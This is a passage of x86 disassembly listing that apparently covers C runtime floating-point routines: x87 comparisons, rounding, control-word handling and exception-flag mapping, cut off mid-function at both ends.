  40d537:	eb b8                	jmp    0x40d4f1
  40d539:	d9 e8                	fld1
  40d53b:	8b 45 10             	mov    0x10(%ebp),%eax
  40d53e:	dd 18                	fstpl  (%eax)
  40d540:	e9 de 00 00 00       	jmp    0x40d623
  40d545:	83 e8 1b             	sub    $0x1b,%eax
  40d548:	0f 84 8c 00 00 00    	je     0x40d5da
  40d54e:	83 e8 01             	sub    $0x1,%eax
  40d551:	74 41                	je     0x40d594
  40d553:	83 e8 15             	sub    $0x15,%eax
  40d556:	74 33                	je     0x40d58b
  40d558:	83 e8 09             	sub    $0x9,%eax
  40d55b:	74 25                	je     0x40d582
  40d55d:	83 e8 03             	sub    $0x3,%eax
  40d560:	74 17                	je     0x40d579
  40d562:	2d ab 03 00 00       	sub    $0x3ab,%eax
  40d567:	74 09                	je     0x40d572
  40d569:	83 e8 01             	sub    $0x1,%eax
  40d56c:	0f 85 b1 00 00 00    	jne    0x40d623
  40d572:	8b 45 08             	mov    0x8(%ebp),%eax
  40d575:	dd 00                	fldl   (%eax)
  40d577:	eb c2                	jmp    0x40d53b
  40d579:	c7 45 e4 88 33 41 00 	movl   $0x413388,-0x1c(%ebp)
  40d580:	eb 19                	jmp    0x40d59b
  40d582:	c7 45 e4 90 33 41 00 	movl   $0x413390,-0x1c(%ebp)
  40d589:	eb 10                	jmp    0x40d59b
  40d58b:	c7 45 e4 98 33 41 00 	movl   $0x413398,-0x1c(%ebp)
  40d592:	eb 07                	jmp    0x40d59b
  40d594:	c7 45 e4 84 33 41 00 	movl   $0x413384,-0x1c(%ebp)
  40d59b:	8b 45 08             	mov    0x8(%ebp),%eax
  40d59e:	8b cf                	mov    %edi,%ecx
  40d5a0:	8b 75 10             	mov    0x10(%ebp),%esi
  40d5a3:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  40d5aa:	dd 00                	fldl   (%eax)
  40d5ac:	8b 45 0c             	mov    0xc(%ebp),%eax
  40d5af:	dd 5d e8             	fstpl  -0x18(%ebp)
  40d5b2:	dd 00                	fldl   (%eax)
  40d5b4:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40d5b7:	dd 5d f0             	fstpl  -0x10(%ebp)
  40d5ba:	dd 06                	fldl   (%esi)
  40d5bc:	50                   	push   %eax
  40d5bd:	dd 5d f8             	fstpl  -0x8(%ebp)
  40d5c0:	ff 15 24 f2 40 00    	call   *0x40f224
  40d5c6:	ff d7                	call   *%edi
  40d5c8:	59                   	pop    %ecx
  40d5c9:	85 c0                	test   %eax,%eax
  40d5cb:	75 51                	jne    0x40d61e
  40d5cd:	e8 e9 9e ff ff       	call   0x4074bb
  40d5d2:	c7 00 21 00 00 00    	movl   $0x21,(%eax)
  40d5d8:	eb 44                	jmp    0x40d61e
  40d5da:	c7 45 e0 02 00 00 00 	movl   $0x2,-0x20(%ebp)
  40d5e1:	c7 45 e4 84 33 41 00 	movl   $0x413384,-0x1c(%ebp)
  40d5e8:	8b 45 08             	mov    0x8(%ebp),%eax
  40d5eb:	8b cf                	mov    %edi,%ecx
  40d5ed:	8b 75 10             	mov    0x10(%ebp),%esi
  40d5f0:	dd 00                	fldl   (%eax)
  40d5f2:	8b 45 0c             	mov    0xc(%ebp),%eax
  40d5f5:	dd 5d e8             	fstpl  -0x18(%ebp)
  40d5f8:	dd 00                	fldl   (%eax)
  40d5fa:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40d5fd:	dd 5d f0             	fstpl  -0x10(%ebp)
  40d600:	dd 06                	fldl   (%esi)
  40d602:	50                   	push   %eax
  40d603:	dd 5d f8             	fstpl  -0x8(%ebp)
  40d606:	ff 15 24 f2 40 00    	call   *0x40f224
  40d60c:	ff d7                	call   *%edi
  40d60e:	59                   	pop    %ecx
  40d60f:	85 c0                	test   %eax,%eax
  40d611:	75 0b                	jne    0x40d61e
  40d613:	e8 a3 9e ff ff       	call   0x4074bb
  40d618:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
  40d61e:	dd 45 f8             	fldl   -0x8(%ebp)
  40d621:	dd 1e                	fstpl  (%esi)
  40d623:	5f                   	pop    %edi
  40d624:	5e                   	pop    %esi
  40d625:	c9                   	leave
  40d626:	c3                   	ret
  40d627:	8b ff                	mov    %edi,%edi
  40d629:	55                   	push   %ebp
  40d62a:	8b ec                	mov    %esp,%ebp
  40d62c:	51                   	push   %ecx
  40d62d:	51                   	push   %ecx
  40d62e:	53                   	push   %ebx
  40d62f:	56                   	push   %esi
  40d630:	be ff ff 00 00       	mov    $0xffff,%esi
  40d635:	56                   	push   %esi
  40d636:	68 3f 1b 00 00       	push   $0x1b3f
  40d63b:	e8 ea e9 ff ff       	call   0x40c02a
  40d640:	dd 45 08             	fldl   0x8(%ebp)
  40d643:	8b d8                	mov    %eax,%ebx
  40d645:	59                   	pop    %ecx
  40d646:	59                   	pop    %ecx
  40d647:	0f b7 4d 0e          	movzwl 0xe(%ebp),%ecx
  40d64b:	b8 f0 7f 00 00       	mov    $0x7ff0,%eax
  40d650:	23 c8                	and    %eax,%ecx
  40d652:	51                   	push   %ecx
  40d653:	51                   	push   %ecx
  40d654:	dd 1c 24             	fstpl  (%esp)
  40d657:	66 3b c8             	cmp    %ax,%cx
  40d65a:	75 3d                	jne    0x40d699
  40d65c:	e8 00 0b 00 00       	call   0x40e161
  40d661:	48                   	dec    %eax
  40d662:	59                   	pop    %ecx
  40d663:	59                   	pop    %ecx
  40d664:	83 f8 02             	cmp    $0x2,%eax
  40d667:	77 0c                	ja     0x40d675
  40d669:	56                   	push   %esi
  40d66a:	53                   	push   %ebx
  40d66b:	e8 ba e9 ff ff       	call   0x40c02a
  40d670:	dd 45 08             	fldl   0x8(%ebp)
  40d673:	eb 61                	jmp    0x40d6d6
  40d675:	dd 45 08             	fldl   0x8(%ebp)
  40d678:	dd 05 a0 33 41 00    	fldl   0x4133a0
  40d67e:	53                   	push   %ebx
  40d67f:	83 ec 10             	sub    $0x10,%esp
  40d682:	d8 c1                	fadd   %st(1),%st
  40d684:	dd 5c 24 08          	fstpl  0x8(%esp)
  40d688:	dd 1c 24             	fstpl  (%esp)
  40d68b:	6a 0c                	push   $0xc
  40d68d:	6a 08                	push   $0x8
  40d68f:	e8 2d 03 00 00       	call   0x40d9c1
  40d694:	83 c4 1c             	add    $0x1c,%esp
  40d697:	eb 3f                	jmp    0x40d6d8
  40d699:	e8 db 02 00 00       	call   0x40d979
  40d69e:	dd 55 f8             	fstl   -0x8(%ebp)
  40d6a1:	dd 45 08             	fldl   0x8(%ebp)
  40d6a4:	83 c4 08             	add    $0x8,%esp
  40d6a7:	dd e1                	fucom  %st(1)
  40d6a9:	df e0                	fnstsw %ax
  40d6ab:	f6 c4 44             	test   $0x44,%ah
  40d6ae:	7b 18                	jnp    0x40d6c8
  40d6b0:	f6 c3 20             	test   $0x20,%bl
  40d6b3:	75 13                	jne    0x40d6c8
  40d6b5:	53                   	push   %ebx
  40d6b6:	83 ec 10             	sub    $0x10,%esp
  40d6b9:	d9 c9                	fxch   %st(1)
  40d6bb:	dd 5c 24 08          	fstpl  0x8(%esp)
  40d6bf:	dd 1c 24             	fstpl  (%esp)
  40d6c2:	6a 0c                	push   $0xc
  40d6c4:	6a 10                	push   $0x10
  40d6c6:	eb c7                	jmp    0x40d68f
  40d6c8:	56                   	push   %esi
  40d6c9:	dd d9                	fstp   %st(1)
  40d6cb:	53                   	push   %ebx
  40d6cc:	dd d8                	fstp   %st(0)
  40d6ce:	e8 57 e9 ff ff       	call   0x40c02a
  40d6d3:	dd 45 f8             	fldl   -0x8(%ebp)
  40d6d6:	59                   	pop    %ecx
  40d6d7:	59                   	pop    %ecx
  40d6d8:	5e                   	pop    %esi
  40d6d9:	5b                   	pop    %ebx
  40d6da:	c9                   	leave
  40d6db:	c3                   	ret
  40d6dc:	8b ff                	mov    %edi,%edi
  40d6de:	55                   	push   %ebp
  40d6df:	8b ec                	mov    %esp,%ebp
  40d6e1:	51                   	push   %ecx
  40d6e2:	51                   	push   %ecx
  40d6e3:	dd 45 08             	fldl   0x8(%ebp)
  40d6e6:	51                   	push   %ecx
  40d6e7:	51                   	push   %ecx
  40d6e8:	dd 1c 24             	fstpl  (%esp)
  40d6eb:	e8 cf 0a 00 00       	call   0x40e1bf
  40d6f0:	59                   	pop    %ecx
  40d6f1:	59                   	pop    %ecx
  40d6f2:	a8 90                	test   $0x90,%al
  40d6f4:	75 4a                	jne    0x40d740
  40d6f6:	dd 45 08             	fldl   0x8(%ebp)
  40d6f9:	51                   	push   %ecx
  40d6fa:	51                   	push   %ecx
  40d6fb:	dd 1c 24             	fstpl  (%esp)
  40d6fe:	e8 76 02 00 00       	call   0x40d979
  40d703:	dd 45 08             	fldl   0x8(%ebp)
  40d706:	dd e1                	fucom  %st(1)
  40d708:	df e0                	fnstsw %ax
  40d70a:	59                   	pop    %ecx
  40d70b:	59                   	pop    %ecx
  40d70c:	dd d9                	fstp   %st(1)
  40d70e:	f6 c4 44             	test   $0x44,%ah
  40d711:	7a 2b                	jp     0x40d73e
  40d713:	dc 0d d0 3b 41 00    	fmull  0x413bd0
  40d719:	51                   	push   %ecx
  40d71a:	51                   	push   %ecx
  40d71b:	dd 55 f8             	fstl   -0x8(%ebp)
  40d71e:	dd 1c 24             	fstpl  (%esp)
  40d721:	e8 53 02 00 00       	call   0x40d979
  40d726:	dd 45 f8             	fldl   -0x8(%ebp)
  40d729:	da e9                	fucompp
  40d72b:	df e0                	fnstsw %ax
  40d72d:	59                   	pop    %ecx
  40d72e:	59                   	pop    %ecx
  40d72f:	f6 c4 44             	test   $0x44,%ah
  40d732:	7a 05                	jp     0x40d739
  40d734:	6a 02                	push   $0x2
  40d736:	58                   	pop    %eax
  40d737:	c9                   	leave
  40d738:	c3                   	ret
  40d739:	33 c0                	xor    %eax,%eax
  40d73b:	40                   	inc    %eax
  40d73c:	c9                   	leave
  40d73d:	c3                   	ret
  40d73e:	dd d8                	fstp   %st(0)
  40d740:	33 c0                	xor    %eax,%eax
  40d742:	c9                   	leave
  40d743:	c3                   	ret
  40d744:	8b ff                	mov    %edi,%edi
  40d746:	55                   	push   %ebp
  40d747:	8b ec                	mov    %esp,%ebp
  40d749:	dd 45 08             	fldl   0x8(%ebp)
  40d74c:	b9 00 00 f0 7f       	mov    $0x7ff00000,%ecx
  40d751:	d9 e1                	fabs
  40d753:	b8 00 00 f0 ff       	mov    $0xfff00000,%eax
  40d758:	39 4d 14             	cmp    %ecx,0x14(%ebp)
  40d75b:	75 3b                	jne    0x40d798
  40d75d:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40d761:	75 75                	jne    0x40d7d8
  40d763:	d9 e8                	fld1
  40d765:	d8 d1                	fcom   %st(1)
  40d767:	df e0                	fnstsw %ax
  40d769:	f6 c4 05             	test   $0x5,%ah
  40d76c:	7a 0f                	jp     0x40d77d
  40d76e:	dd d9                	fstp   %st(1)
  40d770:	dd d8                	fstp   %st(0)
  40d772:	dd 05 60 3d 41 00    	fldl   0x413d60
  40d778:	e9 e9 00 00 00       	jmp    0x40d866
  40d77d:	d8 d1                	fcom   %st(1)
  40d77f:	df e0                	fnstsw %ax
  40d781:	dd d9                	fstp   %st(1)
  40d783:	f6 c4 41             	test   $0x41,%ah
  40d786:	8b 45 18             	mov    0x18(%ebp),%eax
  40d789:	0f 85 da 00 00 00    	jne    0x40d869
  40d78f:	dd d8                	fstp   %st(0)
  40d791:	d9 ee                	fldz
  40d793:	e9 d1 00 00 00       	jmp    0x40d869
  40d798:	39 45 14             	cmp    %eax,0x14(%ebp)
  40d79b:	75 3b                	jne    0x40d7d8
  40d79d:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40d7a1:	75 35                	jne    0x40d7d8
  40d7a3:	d9 e8                	fld1
  40d7a5:	d8 d1                	fcom   %st(1)
  40d7a7:	df e0                	fnstsw %ax
  40d7a9:	f6 c4 05             	test   $0x5,%ah
  40d7ac:	7a 0b                	jp     0x40d7b9
  40d7ae:	dd d9                	fstp   %st(1)
  40d7b0:	dd d8                	fstp   %st(0)
  40d7b2:	d9 ee                	fldz
  40d7b4:	e9 ad 00 00 00       	jmp    0x40d866
  40d7b9:	d8 d1                	fcom   %st(1)
  40d7bb:	df e0                	fnstsw %ax
  40d7bd:	dd d9                	fstp   %st(1)
  40d7bf:	f6 c4 41             	test   $0x41,%ah
  40d7c2:	8b 45 18             	mov    0x18(%ebp),%eax
  40d7c5:	0f 85 9e 00 00 00    	jne    0x40d869
  40d7cb:	dd d8                	fstp   %st(0)
  40d7cd:	dd 05 60 3d 41 00    	fldl   0x413d60
  40d7d3:	e9 91 00 00 00       	jmp    0x40d869
  40d7d8:	dd d8                	fstp   %st(0)
  40d7da:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40d7dd:	75 2e                	jne    0x40d80d
  40d7df:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40d7e3:	0f 85 82 00 00 00    	jne    0x40d86b
  40d7e9:	d9 ee                	fldz
  40d7eb:	dd 45 10             	fldl   0x10(%ebp)
  40d7ee:	d8 d1                	fcom   %st(1)
  40d7f0:	df e0                	fnstsw %ax
  40d7f2:	f6 c4 41             	test   $0x41,%ah
  40d7f5:	0f 84 73 ff ff ff    	je     0x40d76e
  40d7fb:	d8 d9                	fcomp  %st(1)
  40d7fd:	df e0                	fnstsw %ax
  40d7ff:	f6 c4 05             	test   $0x5,%ah
  40d802:	8b 45 18             	mov    0x18(%ebp),%eax
  40d805:	7b 62                	jnp    0x40d869
  40d807:	dd d8                	fstp   %st(0)
  40d809:	d9 e8                	fld1
  40d80b:	eb 5c                	jmp    0x40d869
  40d80d:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40d810:	75 59                	jne    0x40d86b
  40d812:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40d816:	75 53                	jne    0x40d86b
  40d818:	dd 45 10             	fldl   0x10(%ebp)
  40d81b:	51                   	push   %ecx
  40d81c:	51                   	push   %ecx
  40d81d:	dd 1c 24             	fstpl  (%esp)
  40d820:	e8 b7 fe ff ff       	call   0x40d6dc
  40d825:	d9 ee                	fldz
  40d827:	dd 45 10             	fldl   0x10(%ebp)
  40d82a:	59                   	pop    %ecx
  40d82b:	59                   	pop    %ecx
  40d82c:	d8 d1                	fcom   %st(1)
  40d82e:	8b c8                	mov    %eax,%ecx
  40d830:	df e0                	fnstsw %ax
  40d832:	f6 c4 41             	test   $0x41,%ah
  40d835:	75 13                	jne    0x40d84a
  40d837:	dd d9                	fstp   %st(1)
  40d839:	dd d8                	fstp   %st(0)
  40d83b:	dd 05 60 3d 41 00    	fldl   0x413d60
  40d841:	83 f9 01             	cmp    $0x1,%ecx
  40d844:	75 20                	jne    0x40d866
  40d846:	d9 e0                	fchs
  40d848:	eb 1c                	jmp    0x40d866
  40d84a:	d8 d9                	fcomp  %st(1)
  40d84c:	df e0                	fnstsw %ax
  40d84e:	f6 c4 05             	test   $0x5,%ah
  40d851:	7a 0f                	jp     0x40d862
  40d853:	83 f9 01             	cmp    $0x1,%ecx
  40d856:	75 0e                	jne    0x40d866
  40d858:	dd d8                	fstp   %st(0)
  40d85a:	dd 05 70 3d 41 00    	fldl   0x413d70
  40d860:	eb 04                	jmp    0x40d866
  40d862:	dd d8                	fstp   %st(0)
  40d864:	d9 e8                	fld1
  40d866:	8b 45 18             	mov    0x18(%ebp),%eax
  40d869:	dd 18                	fstpl  (%eax)
  40d86b:	33 c0                	xor    %eax,%eax
  40d86d:	5d                   	pop    %ebp
  40d86e:	c3                   	ret
  40d86f:	8b ff                	mov    %edi,%edi
  40d871:	53                   	push   %ebx
  40d872:	8b dc                	mov    %esp,%ebx
  40d874:	51                   	push   %ecx
  40d875:	51                   	push   %ecx
  40d876:	83 e4 f0             	and    $0xfffffff0,%esp
  40d879:	83 c4 04             	add    $0x4,%esp
  40d87c:	55                   	push   %ebp
  40d87d:	8b 6b 04             	mov    0x4(%ebx),%ebp
  40d880:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40d884:	8b ec                	mov    %esp,%ebp
  40d886:	81 ec 88 00 00 00    	sub    $0x88,%esp
  40d88c:	a1 04 60 41 00       	mov    0x416004,%eax
  40d891:	33 c5                	xor    %ebp,%eax
  40d893:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40d896:	8b 43 10             	mov    0x10(%ebx),%eax
  40d899:	56                   	push   %esi
  40d89a:	8b 73 0c             	mov    0xc(%ebx),%esi
  40d89d:	57                   	push   %edi
  40d89e:	0f b7 08             	movzwl (%eax),%ecx
  40d8a1:	89 8d 7c ff ff ff    	mov    %ecx,-0x84(%ebp)
  40d8a7:	8b 06                	mov    (%esi),%eax
  40d8a9:	83 e8 01             	sub    $0x1,%eax
  40d8ac:	74 29                	je     0x40d8d7
  40d8ae:	83 e8 01             	sub    $0x1,%eax
  40d8b1:	74 20                	je     0x40d8d3
  40d8b3:	83 e8 01             	sub    $0x1,%eax
  40d8b6:	74 17                	je     0x40d8cf
  40d8b8:	83 e8 01             	sub    $0x1,%eax
  40d8bb:	74 0e                	je     0x40d8cb
  40d8bd:	83 e8 01             	sub    $0x1,%eax
  40d8c0:	74 15                	je     0x40d8d7
  40d8c2:	83 e8 03             	sub    $0x3,%eax
  40d8c5:	75 6c                	jne    0x40d933
  40d8c7:	6a 10                	push   $0x10
  40d8c9:	eb 0e                	jmp    0x40d8d9
  40d8cb:	6a 12                	push   $0x12
  40d8cd:	eb 0a                	jmp    0x40d8d9
  40d8cf:	6a 11                	push   $0x11
  40d8d1:	eb 06                	jmp    0x40d8d9
  40d8d3:	6a 04                	push   $0x4
  40d8d5:	eb 02                	jmp    0x40d8d9
  40d8d7:	6a 08                	push   $0x8
  40d8d9:	5f                   	pop    %edi
  40d8da:	51                   	push   %ecx
  40d8db:	8d 46 18             	lea    0x18(%esi),%eax
  40d8de:	50                   	push   %eax
  40d8df:	57                   	push   %edi
  40d8e0:	e8 aa 01 00 00       	call   0x40da8f
  40d8e5:	83 c4 0c             	add    $0xc,%esp
  40d8e8:	85 c0                	test   %eax,%eax
  40d8ea:	75 47                	jne    0x40d933
  40d8ec:	8b 4b 08             	mov    0x8(%ebx),%ecx
  40d8ef:	83 f9 10             	cmp    $0x10,%ecx
  40d8f2:	74 10                	je     0x40d904
  40d8f4:	83 f9 16             	cmp    $0x16,%ecx
  40d8f7:	74 0b                	je     0x40d904
  40d8f9:	83 f9 1d             	cmp    $0x1d,%ecx
  40d8fc:	74 06                	je     0x40d904
  40d8fe:	83 65 c0 fe          	andl   $0xfffffffe,-0x40(%ebp)
  40d902:	eb 12                	jmp    0x40d916
  40d904:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40d907:	dd 46 10             	fldl   0x10(%esi)
  40d90a:	83 e0 e3             	and    $0xffffffe3,%eax
  40d90d:	83 c8 03             	or     $0x3,%eax
  40d910:	dd 5d b0             	fstpl  -0x50(%ebp)
  40d913:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40d916:	8d 46 18             	lea    0x18(%esi),%eax
  40d919:	50                   	push   %eax
  40d91a:	8d 46 08             	lea    0x8(%esi),%eax
  40d91d:	50                   	push   %eax
  40d91e:	51                   	push   %ecx
  40d91f:	57                   	push   %edi
  40d920:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40d926:	50                   	push   %eax
  40d927:	8d 45 80             	lea    -0x80(%ebp),%eax
  40d92a:	50                   	push   %eax
  40d92b:	e8 4a 03 00 00       	call   0x40dc7a
  40d930:	83 c4 18             	add    $0x18,%esp
  40d933:	68 ff ff 00 00       	push   $0xffff
  40d938:	ff b5 7c ff ff ff    	push   -0x84(%ebp)
  40d93e:	e8 e7 e6 ff ff       	call   0x40c02a
  40d943:	83 3e 08             	cmpl   $0x8,(%esi)
  40d946:	59                   	pop    %ecx
  40d947:	59                   	pop    %ecx
  40d948:	74 14                	je     0x40d95e
  40d94a:	e8 12 82 ff ff       	call   0x405b61
  40d94f:	84 c0                	test   %al,%al
  40d951:	74 0b                	je     0x40d95e
  40d953:	56                   	push   %esi
  40d954:	e8 2f 82 ff ff       	call   0x405b88
  40d959:	59                   	pop    %ecx
  40d95a:	85 c0                	test   %eax,%eax
  40d95c:	75 08                	jne    0x40d966
  40d95e:	ff 36                	push   (%esi)
  40d960:	e8 2e 06 00 00       	call   0x40df93
  40d965:	59                   	pop    %ecx
  40d966:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40d969:	5f                   	pop    %edi
  40d96a:	33 cd                	xor    %ebp,%ecx
  40d96c:	5e                   	pop    %esi
  40d96d:	e8 d3 5d ff ff       	call   0x403745
  40d972:	8b e5                	mov    %ebp,%esp
  40d974:	5d                   	pop    %ebp
  40d975:	8b e3                	mov    %ebx,%esp
  40d977:	5b                   	pop    %ebx
  40d978:	c3                   	ret
  40d979:	8b ff                	mov    %edi,%edi
  40d97b:	55                   	push   %ebp
  40d97c:	8b ec                	mov    %esp,%ebp
  40d97e:	51                   	push   %ecx
  40d97f:	51                   	push   %ecx
  40d980:	dd 45 08             	fldl   0x8(%ebp)
  40d983:	d9 fc                	frndint
  40d985:	dd 5d f8             	fstpl  -0x8(%ebp)
  40d988:	dd 45 f8             	fldl   -0x8(%ebp)
  40d98b:	c9                   	leave
  40d98c:	c3                   	ret
  40d98d:	8b ff                	mov    %edi,%edi
  40d98f:	55                   	push   %ebp
  40d990:	8b ec                	mov    %esp,%ebp
  40d992:	8b 45 08             	mov    0x8(%ebp),%eax
  40d995:	a8 20                	test   $0x20,%al
  40d997:	74 04                	je     0x40d99d
  40d999:	6a 05                	push   $0x5
  40d99b:	eb 17                	jmp    0x40d9b4
  40d99d:	a8 08                	test   $0x8,%al
  40d99f:	74 05                	je     0x40d9a6
  40d9a1:	33 c0                	xor    %eax,%eax
  40d9a3:	40                   	inc    %eax
  40d9a4:	5d                   	pop    %ebp
  40d9a5:	c3                   	ret
  40d9a6:	a8 04                	test   $0x4,%al
  40d9a8:	74 04                	je     0x40d9ae
  40d9aa:	6a 02                	push   $0x2
  40d9ac:	eb 06                	jmp    0x40d9b4
  40d9ae:	a8 01                	test   $0x1,%al
  40d9b0:	74 05                	je     0x40d9b7
  40d9b2:	6a 03                	push   $0x3
  40d9b4:	58                   	pop    %eax
  40d9b5:	5d                   	pop    %ebp
  40d9b6:	c3                   	ret
  40d9b7:	0f b6 c0             	movzbl %al,%eax
  40d9ba:	83 e0 02             	and    $0x2,%eax
  40d9bd:	03 c0                	add    %eax,%eax
  40d9bf:	5d                   	pop    %ebp
  40d9c0:	c3                   	ret
  40d9c1:	8b ff                	mov    %edi,%edi
  40d9c3:	53                   	push   %ebx
  40d9c4:	8b dc                	mov    %esp,%ebx
  40d9c6:	51                   	push   %ecx
  40d9c7:	51                   	push   %ecx
  40d9c8:	83 e4 f0             	and    $0xfffffff0,%esp
  40d9cb:	83 c4 04             	add    $0x4,%esp
  40d9ce:	55                   	push   %ebp
  40d9cf:	8b 6b 04             	mov    0x4(%ebx),%ebp
  40d9d2:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40d9d6:	8b ec                	mov    %esp,%ebp
  40d9d8:	81 ec 88 00 00 00    	sub    $0x88,%esp
  40d9de:	a1 04 60 41 00       	mov    0x416004,%eax
  40d9e3:	33 c5                	xor    %ebp,%eax
  40d9e5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40d9e8:	56                   	push   %esi
  40d9e9:	8b 73 20             	mov    0x20(%ebx),%esi
  40d9ec:	8d 43 18             	lea    0x18(%ebx),%eax
  40d9ef:	57                   	push   %edi
  40d9f0:	56                   	push   %esi
  40d9f1:	50                   	push   %eax
  40d9f2:	ff 73 08             	push   0x8(%ebx)
  40d9f5:	e8 95 00 00 00       	call   0x40da8f
  40d9fa:	83 c4 0c             	add    $0xc,%esp
  40d9fd:	85 c0                	test   %eax,%eax
  40d9ff:	75 26                	jne    0x40da27
  40da01:	83 65 c0 fe          	andl   $0xfffffffe,-0x40(%ebp)
  40da05:	50                   	push   %eax
  40da06:	8d 43 18             	lea    0x18(%ebx),%eax
  40da09:	50                   	push   %eax
  40da0a:	8d 43 10             	lea    0x10(%ebx),%eax
  40da0d:	50                   	push   %eax
  40da0e:	ff 73 0c             	push   0xc(%ebx)
  40da11:	8d 43 20             	lea    0x20(%ebx),%eax
  40da14:	ff 73 08             	push   0x8(%ebx)
  40da17:	50                   	push   %eax
  40da18:	8d 45 80             	lea    -0x80(%ebp),%eax
  40da1b:	50                   	push   %eax
  40da1c:	e8 7c 02 00 00       	call   0x40dc9d
  40da21:	8b 73 20             	mov    0x20(%ebx),%esi
  40da24:	83 c4 1c             	add    $0x1c,%esp
  40da27:	ff 73 08             	push   0x8(%ebx)
  40da2a:	e8 5e ff ff ff       	call   0x40d98d
  40da2f:	59                   	pop    %ecx
  40da30:	8b f8                	mov    %eax,%edi
  40da32:	e8 2a 81 ff ff       	call   0x405b61
  40da37:	84 c0                	test   %al,%al
  40da39:	74 29                	je     0x40da64
  40da3b:	85 ff                	test   %edi,%edi
  40da3d:	74 25                	je     0x40da64
  40da3f:	dd 43 18             	fldl   0x18(%ebx)
  40da42:	56                   	push   %esi
  40da43:	83 ec 18             	sub    $0x18,%esp
  40da46:	dd 5c 24 10          	fstpl  0x10(%esp)
  40da4a:	d9 ee                	fldz
  40da4c:	dd 5c 24 08          	fstpl  0x8(%esp)
  40da50:	dd 43 10             	fldl   0x10(%ebx)
  40da53:	dd 1c 24             	fstpl  (%esp)
  40da56:	ff 73 0c             	push   0xc(%ebx)
  40da59:	57                   	push   %edi
  40da5a:	e8 63 05 00 00       	call   0x40dfc2
  40da5f:	83 c4 24             	add    $0x24,%esp
  40da62:	eb 18                	jmp    0x40da7c
  40da64:	57                   	push   %edi
  40da65:	e8 29 05 00 00       	call   0x40df93
  40da6a:	c7 04 24 ff ff 00 00 	movl   $0xffff,(%esp)
  40da71:	56                   	push   %esi
  40da72:	e8 b3 e5 ff ff       	call   0x40c02a
  40da77:	dd 43 18             	fldl   0x18(%ebx)
  40da7a:	59                   	pop    %ecx
  40da7b:	59                   	pop    %ecx
  40da7c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40da7f:	5f                   	pop    %edi
  40da80:	33 cd                	xor    %ebp,%ecx
  40da82:	5e                   	pop    %esi
  40da83:	e8 bd 5c ff ff       	call   0x403745
  40da88:	8b e5                	mov    %ebp,%esp
  40da8a:	5d                   	pop    %ebp
  40da8b:	8b e3                	mov    %ebx,%esp
  40da8d:	5b                   	pop    %ebx
  40da8e:	c3                   	ret
  40da8f:	8b ff                	mov    %edi,%edi
  40da91:	55                   	push   %ebp
  40da92:	8b ec                	mov    %esp,%ebp
  40da94:	83 ec 10             	sub    $0x10,%esp
  40da97:	53                   	push   %ebx
  40da98:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40da9b:	56                   	push   %esi
  40da9c:	8b f3                	mov    %ebx,%esi
  40da9e:	83 e6 1f             	and    $0x1f,%esi
  40daa1:	f6 c3 08             	test   $0x8,%bl
  40daa4:	74 16                	je     0x40dabc
  40daa6:	f6 45 10 01          	testb  $0x1,0x10(%ebp)
  40daaa:	74 10                	je     0x40dabc
  40daac:	6a 01                	push   $0x1
  40daae:	e8 a1 e5 ff ff       	call   0x40c054
  40dab3:	59                   	pop    %ecx
  40dab4:	83 e6 f7             	and    $0xfffffff7,%esi
  40dab7:	e9 9d 01 00 00       	jmp    0x40dc59
  40dabc:	8b c3                	mov    %ebx,%eax
  40dabe:	23 45 10             	and    0x10(%ebp),%eax
  40dac1:	a8 04                	test   $0x4,%al
  40dac3:	74 10                	je     0x40dad5
  40dac5:	6a 04                	push   $0x4
  40dac7:	e8 88 e5 ff ff       	call   0x40c054
  40dacc:	59                   	pop    %ecx
  40dacd:	83 e6 fb             	and    $0xfffffffb,%esi
  40dad0:	e9 84 01 00 00       	jmp    0x40dc59
  40dad5:	f6 c3 01             	test   $0x1,%bl
  40dad8:	0f 84 9a 00 00 00    	je     0x40db78
  40dade:	f6 45 10 08          	testb  $0x8,0x10(%ebp)
  40dae2:	0f 84 90 00 00 00    	je     0x40db78
  40dae8:	6a 08                	push   $0x8
  40daea:	e8 65 e5 ff ff       	call   0x40c054
  40daef:	8b 45 10             	mov    0x10(%ebp),%eax
  40daf2:	59                   	pop    %ecx
  40daf3:	b9 00 0c 00 00       	mov    $0xc00,%ecx
  40daf8:	23 c1                	and    %ecx,%eax
  40dafa:	74 54                	je     0x40db50
  40dafc:	3d 00 04 00 00       	cmp    $0x400,%eax
  40db01:	74 37                	je     0x40db3a
  40db03:	3d 00 08 00 00       	cmp    $0x800,%eax
  40db08:	74 1a                	je     0x40db24
  40db0a:	3b c1                	cmp    %ecx,%eax
  40db0c:	75 62                	jne    0x40db70
  40db0e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40db11:	d9 ee                	fldz
  40db13:	dc 19                	fcompl (%ecx)
  40db15:	df e0                	fnstsw %ax
  40db17:	dd 05 68 3d 41 00    	fldl   0x413d68
  40db1d:	f6 c4 05             	test   $0x5,%ah
  40db20:	7b 4c                	jnp    0x40db6e
  40db22:	eb 48                	jmp    0x40db6c
  40db24:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40db27:	d9 ee                	fldz
  40db29:	dc 19                	fcompl (%ecx)
  40db2b:	df e0                	fnstsw %ax
  40db2d:	f6 c4 05             	test   $0x5,%ah
  40db30:	7b 2c                	jnp    0x40db5e
  40db32:	dd 05 68 3d 41 00    	fldl   0x413d68
  40db38:	eb 32                	jmp    0x40db6c
  40db3a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40db3d:	d9 ee                	fldz
  40db3f:	dc 19                	fcompl (%ecx)
